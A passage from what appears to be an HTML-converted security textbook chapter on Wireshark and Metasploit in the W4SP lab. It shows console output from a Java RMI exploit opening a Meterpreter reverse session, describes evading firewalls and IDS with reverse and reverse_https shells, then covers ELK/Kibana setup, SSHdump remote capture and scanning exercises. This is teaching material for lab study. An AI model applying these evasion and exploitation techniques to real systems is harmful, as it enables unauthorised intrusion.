New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.103</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >java_rmi_server - Replied to request</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for payload</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >JAR</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:66.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] 192.168.56.103:60233 Request received for /INITJM&#8230; [*] Meterpreter session 3 opened (192.168.56.106:4444 -&#62; 192.168.56.103:60233) at 2014-11-13 20:02:11 -0600</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[+] Target 192.168.56.103:1099 may be exploitable&#8230; [*] Server stopped.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >meterpreter &#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:52.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you follow the TCP stream and do a search for </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >metasploit</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, Wireshark will not find any instances of it (see<a name="_bookmark516" ></a>&nbsp;</span><span><a href="#_bookmark518" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-17</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="764"  height="597"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker344793.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark518" ></a><span><a href="#_bookmark516" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-17:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Encrypted traffic</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section268" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:10.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this section, we walked through the basics of how to exploit vulnerable services using the Metasploit Framework. We showed what a basic bind shell looks like on the network and how it can be</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >thwarted by conventional firewall rules. We then showed how to bypass firewall restrictions using a reverse shell. Finally, we showed how you can use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >reverse_https </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Meterpreter to bypass IPS/IDS by encrypting Meterpreter traffic within a TLS/SSL tunnel. TLS and SSL are the cryptographic protocols that provide encryption to the tunneled traffic. TLS stands for Transport Layer Security, a newer protocol compared to the Secure Sockets Layer (SSL)</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.6000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >protocol.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Starting ELK</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:28.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ELK stands for Elasticsearch/Logstash/Kibana. These three open- source applications make up the Elastic Stack (previously called the ELK Stack) and can take data from virtually any source and format and present it visually. The ELK Stack allows you to search and analyze the data as well. It&#8217;s a very powerful combination, and as open-source is free to use and tweak as you need.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To briefly describe each of the applications, Elasticsearch is a searchable database; Kibana is a web-based user interface for Elasticsearch; and, lastly, Logstash is a tool that parses logs and puts them into the Elasticsearch database.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.6500pt;margin-right:48.1000pt;text-align:justify;text-justify:inter-ideograph;" ><a name="_bookmark519" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You will use the Elastic Stack in your W4SP Lab. Fortunately,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >it&#8217;s already installed for you. All that is needed is to start up the ELK image. To do so, return to the W4SP Lab front</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >screen.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The red buttons on the right of W4SP Lab screen customize portions of the lab environment. Click Start IPS. This starts an IPS. You will see an additional node labeled </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >IPS</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, and then you will notice the Start ELK button is now grayed out since starting the IPS. The ELK button is grayed out because it is now running along with the IPS. In the W4SP Lab, the data source for the Elastic Stack is the IDS. The IDS alerts feed the ELK system.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click Refresh on the left of the lab screen. You should see the ELK</span><span><a href="#_bookmark521" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;machine connected to the subnet </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >10.100.200.x</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, as shown in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >18</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section269" ><p class=MsoBodyText ><img width="780"  height="288"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker346947.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><h3 style="margin-top:5.0000pt;" ><a name="_bookmark521" ></a><span><a href="#_bookmark520" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-18:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-weight:normal;font-size:15.0000pt;" >ELK</span><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:normal;font-size:15.0000pt;" ><o:p></o:p></span></h3><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Hover over that system and note its IP address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Open the browser to that IP address, port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >5601</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. In </span><span><a href="#_bookmark521" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-18</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the ELK system has IP address </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >10.100.200.162</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, so the browser URL should be </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >http://10.100.200.162:5601</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The front end, Kibana, appears. The first screen presented should prompt you to configure the first index pattern. Index patterns, as explained at the top of the screen, tie into Elasticsearch to facilitate searches.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The only setting you need to configure is the Time-field name. This setting is found at the bottom of the Configure an Index Pattern screen, as shown in<a name="_bookmark522" ></a>&nbsp;</span><span><a href="#_bookmark523" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-19</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="777"  height="125"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker347661.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark523" ></a><span><a href="#_bookmark522" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-19:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Time-field name</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><a name="_bookmark524" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Scroll down to find the Time-field name setting. The Time-field name configures how ELK filters events based on the global time filter. On the Time-field name field, pull down to select </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >timestamp </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >not </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >@timestamp).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section270" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:252.0000px;" ><img width="763"  height="252"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker347964.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:6.0000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After you choose timestamp for the Time-field name setting, click the Create button just below it. You should see the screen immediately show additional fields and their settings.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You do not need to change anything else, but feel free to explore the Kibana interface. You may now leave the Settings page and go to the Discover page. At the top of the screen, click the Discover tab. Clicking Discover opens a real-time display of IDS alerts. Browse through and explore what alerts are being raised by the IDS.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark525" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Remote Capture over SSH" ></a>Remote Capture over SSH</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Want to capture from a remote host? Need to do so over an SSH tunnel? Wireshark offers that as well. While the ability to capture over an encrypted tunnel isn&#8217;t intended to be for malicious purposes, you could argue there certainly is chance for misuse.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark&#8217;s SSHdump feature enables you to capture remotely and tunnel the traffic over SSH. The SSHdump feature is not enabled by default when you first install Wireshark in Windows, so you might need to revisit installing Wireshark. To use this feature, download and open the installation executable, available from </span><span><a href="http://www.wireshark.org/" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >www.wireshark.org</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You are presented with installation options. The default list of components includes a section called Tools. One of the listed tools is SSHdump, an extcap tool that lets you run a remote capture over an SSH connection. Expand the Tools section to access SSHdump, as shown in<a name="_bookmark526" ></a>&nbsp;</span><span><a href="#_bookmark527" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-20</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Note that SSHdump is </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >unchecked </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >by default. To use SSHdump, either check the box during installation or rerun the installation wizard.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section271" ><p class=MsoBodyText  style="margin-left:59.7500pt;" ><img width="609"  height="474"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker349594.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark527" ></a><span><a href="#_bookmark526" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-20:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >SSHdump install</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once SSHdump is installed, you can connect to a remote system (given permissions) and launch Wireshark. The trace will be piped to you via SSHdump for your remote monitoring and analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="Summary" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark528" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This chapter differed from other chapters by taking the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >offensive </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >perspective. You used Wireshark not to troubleshoot network problems, but to troubleshoot attacks, possibly creating network problems. To start the chapter and give the chapter structure, the attack methodology used by hackers is used to provide context for demonstrating Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We started out with a refresher on getting the W4SP Lab running. We then began using Wireshark to verify scanning efforts. Wireshark will show both probing packets sent out as well as the replies sent back by the target hosts. Then the chapter spoke to evading intrusion detection systems and applied a few different methods.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark was used to helped examine exploits. This included</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section272" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >working with Metasploit to gain remote shell access to a target machine using varying types of meterpreter shells. We went through the issues and difference with the various payloads, and in particular how and when to execute both bind shells and reverse shells.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Also, we explored Elastic Stack, the open-source suite of tools to visualize data from the W4SP Lab intrusion detection system. The ELK system allowed you to search and analyze the IDS alerts as they occur.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><a name="_bookmark529" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lastly, we discovered the Wireshark feature to remotely capture traffic and send it for analysis across an encrypted SSH tunnel.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark530" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Exercises" ></a>Exercises</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=17  style="margin-top:9.8500pt;margin-right:18.4500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l18 level1 lfo20;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Use a portscanner other than nmap to scan the local network.</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Use Wireshark to capture and examine the probing</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.7500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:18.6500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l18 level1 lfo20;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At the Metasploit console prompt, search using the term</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >portscan </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to list other types of scanners. Use Wireshark to identify and/or confirm the differences between ACK, SYN, TCP and other</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >scans.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  